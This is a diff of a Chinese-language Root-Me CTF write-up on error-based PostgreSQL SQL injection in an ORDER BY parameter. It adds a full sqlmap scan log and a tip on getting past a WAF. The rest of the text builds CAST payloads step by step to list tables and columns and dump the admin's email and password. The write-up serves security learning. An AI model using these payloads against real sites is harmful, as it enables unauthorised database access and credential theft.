@@ -73,31 +73,150 @@
 
 ------------
 
-## 探针
+## 通过 sqlmap 找到探针
 
 > 注：PostgreSql 数据库，通常也简称为 pgsql 。
 
-知道数据库类型，就可以针对性注入了。而对于 pgsql ，可以在 order by 后面注入的 payload 是非常少的。
+知道数据库类型，就可以针对性注入了。而对于 pgsql ，据我所知可以在 order by 后面注入的 payload 是不多的。
 
-下面这个是由 `sqlmap` 提供的为数不多的 payload 之一：
+在这里可以借助 sqlmap 先找到探针。
 
-```sql
-ASC,(CAST((CHR(113)||CHR(98)||CHR(112)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (1788=1788) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(107)||CHR(113)||CHR(113)) AS NUMERIC))
-```
+如果 Burp Suite 已经加了 sqlmap 插件，可以直接把完整的 HTTP 请求发送到 sqlmap （注意这个请求的 URL 不要注入前面的其他东西，保持题目最原始的参数即可）：
 
 ![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/10.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/11.png)
 
-这个 payload 并不能用来解决这个挑战，它是 `sqlmap` 用于确认被注入的 SQL 是什么类型的**探针**。
 
-通过这个探针 `sqlmap` 就可以确定这是属于 pgsql 数据库的、基于错误的 SQL 注入题型。
+这里记录了 sqlmap 的扫描结果：
 
-> 注：Rootme 等多个 CTF 平台现在已经对 `sqlmap` 等工具进行了屏蔽，避免被直接解题，所以真正的 payload 还是要靠自己慢慢寻找。不过致力于用 `sqlmap` 解题的可以尝试想办法绕过 WAF ，但关于如何绕过我就不提供建议了，毕竟最好还是掌握 SQL 注入的技术更重要。
+```shell
+S:\04_work\BurpSuite>sqlmap.py -r C:\Users\ADMINI~1\AppData\Local\Temp\\1552703940473.req
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.3.3.23#dev}
+|_ -| . [)]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
 
-这个探针最大的作用是对于我们构造 payload 具有指导性作用。
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-注入探针后我们得到回显输出 `ERROR:  invalid input syntax for type numeric: "qbpzq1qjkqq"` ，
+[*] starting @ 10:39:03 /2019-03-16/
 
-输出中有一串字符串 `qbpzq1qjkqq` 其实就是这个探针控制得到的。
+[10:39:03] [INFO] parsing HTTP request from 'C:\Users\ADMINI~1\AppData\Local\Temp\\1552703940473.req'
+[10:39:04] [INFO] testing connection to the target URL
+[10:39:05] [INFO] checking if the target is protected by some kind of WAF/IPS
+[10:39:05] [INFO] testing if the target URL content is stable
+[10:39:06] [INFO] target URL content is stable
+[10:39:06] [INFO] testing if GET parameter 'action' is dynamic
+[10:39:06] [INFO] GET parameter 'action' appears to be dynamic
+[10:39:07] [WARNING] heuristic (basic) test shows that GET parameter 'action' might not be injectable
+[10:39:07] [INFO] testing for SQL injection on GET parameter 'action'
+[10:39:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[10:39:12] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[10:39:13] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[10:39:15] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[10:39:17] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[10:39:19] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[10:39:21] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[10:39:21] [INFO] testing 'MySQL inline queries'
+[10:39:22] [INFO] testing 'PostgreSQL inline queries'
+[10:39:22] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[10:39:23] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[10:39:24] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[10:39:26] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[10:39:27] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[10:39:29] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[10:39:31] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[10:39:33] [INFO] testing 'Oracle AND time-based blind'
+[10:39:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[10:40:01] [WARNING] GET parameter 'action' does not seem to be injectable
+[10:40:01] [INFO] testing if GET parameter 'order' is dynamic
+[10:40:02] [WARNING] GET parameter 'order' does not appear to be dynamic
+[10:40:02] [INFO] heuristic (basic) test shows that GET parameter 'order' might be injectable (possible DBMS: 'PostgreSQL')
+[10:40:03] [INFO] testing for SQL injection on GET parameter 'order'
+it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[10:40:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[10:40:28] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[10:40:28] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[10:40:31] [WARNING] reflective value(s) found and filtering out
+[10:41:06] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
+[10:41:48] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
+[10:41:49] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
+[10:41:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
+[10:41:51] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
+[10:41:52] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
+[10:41:54] [INFO] GET parameter 'order' appears to be 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause' injectable
+[10:41:54] [INFO] testing 'PostgreSQL error-based - Parameter replace'
+[10:41:55] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
+[10:41:55] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
+[10:41:56] [INFO] GET parameter 'order' is 'PostgreSQL error-based - ORDER BY, GROUP BY clause' injectable
+[10:41:56] [INFO] testing 'PostgreSQL inline queries'
+[10:41:56] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[10:41:57] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
+[10:41:57] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
+[10:41:58] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
+[10:41:58] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
+[10:41:59] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
+[10:41:59] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[10:42:02] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
+[10:42:03] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
+[10:42:03] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
+[10:42:04] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
+[10:42:04] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
+[10:42:09] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
+[10:42:09] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
+[10:42:10] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
+[10:42:10] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
+[10:42:11] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
+[10:42:11] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
+[10:42:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[10:42:12] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+GET parameter 'order' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 373 HTTP(s) requests:
+---
+Parameter: order (GET)
+    Type: boolean-based blind
+    Title: PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause
+    Payload: action=contents&order=ASC,(SELECT (CASE WHEN (6759=6759) THEN 1 ELSE 1/(SELECT 0) END))
+
+    Type: error-based
+    Title: PostgreSQL error-based - ORDER BY, GROUP BY clause
+    Payload: action=contents&order=ASC,(CAST((CHR(113)||CHR(118)||CHR(120)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (5026=5026) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(120)||CHR(98)||CHR(113)) AS NUMERIC))
+---
+[10:42:31] [INFO] the back-end DBMS is PostgreSQL
+web application technology: Nginx
+back-end DBMS: PostgreSQL
+[10:42:31] [INFO] fetched data logged to text files under 'C:\Users\Administrator\AppData\Local\sqlmap\output\challenge01.root-me.org'
+
+[*] ending @ 10:42:31 /2019-03-16/
+```
+
+> 注：某些 CTF 平台会对 `sqlmap` 等工具进行 WAF 屏蔽，直接结果就是导致扫描失败，所以还是尽可能更多地总结自己 SQLi 的探针。不过即使被 WAF 还是有办法绕过的，例如利用 tamper，或直接找到源站 IP 。
+
+通过 sqlmap 的扫描结果，可以知道这个确实是 PostgreSQL 数据库，且Web 框架是 Nginx 。
+
+同时也发现了页面 [http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC](http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC) 其实是有两种注入方式的：
+
+
+```sql
+// 基于布尔盲注，探针是：
+action=contents&order=ASC,(SELECT (CASE WHEN (6759=6759) THEN 1 ELSE 1/(SELECT 0) END))
+
+// 基于错误注入，探针是
+action=contents&order=
+ASC,(CAST((CHR(113)||CHR(118)||CHR(120)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (5026=5026) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(120)||CHR(98)||CHR(113)) AS NUMERIC))
+```
+
+但既然题目是基于错误的 SQL 注入，布尔盲注的探针就先不管了。
+
+我们尝试使用后一个探针，得到回显输出 `ERROR:  invalid input syntax for type numeric: "qvxbq1qxxbq"` 。
+
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/12.png)
+
+> 需知道探针并不能用来解决这个挑战，它最大的作用是对于我们构造 payload 具有指导性作用。
+
+注意到回显输出中有一串字符串 `qbpzq1qjkqq` 其实就是这个探针控制得到的。
 
 但是为什么会得到这个字符串？不妨来分析一下。这个探针看似复杂，其实十分简单，先拆解下结构：
 
@@ -105,15 +224,17 @@ ASC,(CAST((CHR(113)||CHR(98)||CHR(112)||CHR(122)||CHR(113))||(SELECT (CASE WHEN 
 ASC,(
   CAST(
         (
-          CHR(113)||CHR(98)||CHR(112)||CHR(122)||CHR(113)
+          CHR(113)||CHR(118)||CHR(120)||CHR(98)||CHR(113)
         )
         ||
         (
           SELECT (
-            CASE WHEN (1788=1788) THEN 1 ELSE 0 END)
-          )::text
-          ||
-          (CHR(113)||CHR(106)||CHR(107)||CHR(113)||CHR(113)
+            CASE WHEN (5026=5026) THEN 1 ELSE 0 END
+          )
+        )::text
+        ||
+        (
+          CHR(113)||CHR(120)||CHR(120)||CHR(98)||CHR(113)
         )
   AS NUMERIC)
 )
@@ -122,18 +243,18 @@ ASC,(
 这个探针结构有几个的 pgsql 语法点：
 
 - `CAST(xxx AS NUMERIC)` 表示把 `xxx` 强制转换为 `NUMERIC` 数字类型
-- `CHR(ASCII)` 实际上就是 ASCII 字符 （目的就是避免使用无法注入的引号）
+- `CHR(ASCII)` 实际上就是随机选的 ASCII 字符 （目的只是避免使用无法注入的引号）
 - `||` 是拼接字符或字符串的操作符号 （不是 或运算）
 - `(xxx)::text `表示把 `xxx` 强制转换成 `text` 文本类型（即字符串）
 - `CASE WHEN` 不难理解就是条件运算符了
 
 根据这几个语法点，不难知道：
 
-- `SELECT` 前面的字符拼接，得到的字符串是 `qbpzq`
+- `SELECT` 前面的字符拼接，得到的字符串是 `qvxbq`
 - `SELECT` 本身的条件运算，得到数字 `1` 且转换成字符串
-- `SELECT` 后面的字符拼接，得到的字符串是 `qjkqq`
-- 把这三部分拼接起来就是字符串 `qbpzq1qjkqq`
-- `CAST` 尝试把字符串 `qbpzq1qjkqq` 转换成数字，于是抛出异常，而在异常中输出了这个字符串
+- `SELECT` 后面的字符拼接，得到的字符串是 `qxxbq`
+- 把这三部分拼接起来就是字符串 `qvxbq1qxxbq`
+- `CAST` 尝试把字符串 `qvxbq1qxxbq` 转换成数字，于是抛出异常，而在异常中输出了这个字符串
 
 简单来说，这个探针就是利用 `CAST` 强制类型转换失败抛出异常的原理，抛出我们想要的内容。
 
@@ -147,7 +268,7 @@ ASC,(
 
 - 原本最开头的 `ASC` 可以不需要，因为排序默认就是 `ASC` （注意逗号 `,` 不能丢）
 - 拼接 `CHR(62)||` 是确保 `CAST NUMERIC` 的必定是字符串，即必定报错抛出异常 （`CHR(62)` 是字符 `>`）
-- `[注入SQL]` 就是我们控制查询数据库信息的 SQL ，要求返回值只有 1 个值 （而不能是一张表）
+- `[注入SQL]` 就是我们控制查询数据库信息的 SQL ，要求返回值只有 1 个值（**准确而言是 1 行 1 列**，而不能是一张表）
 
 ------------
 
@@ -159,13 +280,13 @@ ASC,(
 
 得到：PostgreSQL 9.3.20 on x86_64-unknown-linux-gnu, compiled by gcc (Ubuntu 4.8.4-2ubuntu1~14.04.3) 4.8.4, 64-bit
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/11.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/13.png)
 
 又如要获取数据库名称：`,(CAST(CHR(62)||(SELECT CURRENT_DATABASE()) AS NUMERIC))`
 
 得到：c_webserveur_34
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/12.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/14.png)
 
 ------------
 
@@ -175,13 +296,13 @@ ASC,(
 
 在 pgsql 中，有一张固定的系统表 `pg_tables` 记录了所有库中所有表，其 [表结构](https://www.postgresql.org/docs/8.3/view-pg-tables.html) 为：
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/13.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/15.png)
 
 先构造这样的 payload 查看当前数据库表的数量，一共 60 张表：
 
 `,(CAST(CHR(62)||(SELECT COUNT(1) FROM pg_tables) AS NUMERIC))`
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/14.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/16.png)
 
 
 从 `pg_tables` 的表结构可以知道其中一列是 `tablename` ，尝试构造这样的 payload 获得所有表名：
@@ -190,7 +311,7 @@ ASC,(
 
 但是出错了，原因是构造的 SELECT 表达式返回的值不能超过 1 行。
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/15.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/17.png)
 
 在 payload 中添加 `LIMIT 1` 即可避免此异常：
 
@@ -198,14 +319,15 @@ ASC,(
 
 成功获得了第一张表名 `pg_statistic` 。
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/16.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/18.png)
+
 
 
 但 `LIMIT 1` 限制了每次都只能取到第一张表，又要怎样得到所有表名 ?
 
 其实方法也有很多，例如利用偏移 `LIMIT 1 OFFSET k` ，只要把 `k` 从 0 枚举到 59 ，发起请求 60 次，即可得到全部 60 张表， payload 为：`,(CAST(CHR(62)||(SELECT tablename from pg_tables LIMIT 1 OFFSET k) AS NUMERIC))` （注意把 `k` 换成数字）。可以编程实现 `k` 值枚举，不过这里推荐使用 Burp Suite 的 Intruder 实现：
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/17.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/19.png)
 
 根据不同的 `k` 值获得的 60 张表名如下：
 
@@ -284,7 +406,7 @@ ASC,(
 
 `,(CAST(CHR(62)||(SELECT COUNT(1) FROM m3mbr35t4bl3) AS NUMERIC))`
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/18.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/20.png)
 
 
 尝试构造 payload 直接读取这行数据：
@@ -293,7 +415,7 @@ ASC,(
 
 但是又出错了，原因是构造的 SELECT 表达式返回的值除了不能超过 1 行，还不能超过 1 列。
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/19.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/21.png)
 
 但是我们不知道 `m3mbr35t4bl3` 表的列名，为此先要设法找到其列名。
 
@@ -316,7 +438,7 @@ SELECT attname FROM pg_attribute pa, pg_class pc WHERE pa.attrelid = pc.oid AND 
 
 `,(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY 1) AS NUMERIC))`
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/20.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/22.png)
 
 从异常中抛出了其中一列的列名 `us3rn4m3_c0l` ，声称其未被包含在 `GROUP BY` 中。
 
@@ -324,19 +446,19 @@ SELECT attname FROM pg_attribute pa, pg_class pc WHERE pa.attrelid = pc.oid AND 
 
 `,(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l) AS NUMERIC))`
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/21.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/23.png)
 
 这次又从异常中抛出了新的一列 `id`，利用之构造新的 payload 如下：
 
 `,(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l, id) AS NUMERIC))`
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/22.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/24.png)
 
 再次从异常中得到新的一列 `p455w0rd_c0l`，利用之构造新的 payload 如下：
 
 `,(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l, id, p455w0rd_c0l) AS NUMERIC))`
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/23.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/25.png)
 
 继而从异常中得到新的一列 `em41l_c0l`，利用之构造新的 payload 如下：
 
@@ -346,7 +468,7 @@ SELECT attname FROM pg_attribute pa, pg_class pc WHERE pa.attrelid = pc.oid AND 
 
 说明 `GROUP BY` 已经包含了所有列并查询了结果返回，但新返回值多于 1 列，所以使得我们的 payload 报错。
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/24.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/26.png)
 
 ------------
 
@@ -364,25 +486,25 @@ SELECT attname FROM pg_attribute pa, pg_class pc WHERE pa.attrelid = pc.oid AND 
 
 `,(CAST(CHR(62)||(SELECT id FROM m3mbr35t4bl3) AS NUMERIC))`
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/25.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/27.png)
 
 如下构造查询 `em41l_c0l` 列数据的 payload，得到 `admin@localhost` ：
 
 `,(CAST(CHR(62)||(SELECT em41l_c0l FROM m3mbr35t4bl3) AS NUMERIC))`
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/26.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/28.png)
 
 如下构造查询 `us3rn4m3_c0l` 列数据的 payload，得到 `admin` ：
 
 `,(CAST(CHR(62)||(SELECT us3rn4m3_c0l FROM m3mbr35t4bl3) AS NUMERIC))`
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/27.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/29.png)
 
 如下构造查询 `p455w0rd_c0l` 列数据的 payload，得到 `1a2BdKT5DIx3qxQN3UaC` ：
 
 `,(CAST(CHR(62)||(SELECT p455w0rd_c0l FROM m3mbr35t4bl3) AS NUMERIC))`
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/28.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/30.png)
 
 ------------
 
@@ -390,7 +512,7 @@ SELECT attname FROM pg_attribute pa, pg_class pc WHERE pa.attrelid = pc.oid AND 
 
 使用得到的账号 `admin` 和密码 `1a2BdKT5DIx3qxQN3UaC` 登陆，得知这个密码就是 flag，完成挑战：
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/29.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B47%5D%20%5B40P%5D%20SQL%20injection%20-%20Error/imgs/31.png)
 
 ------
 
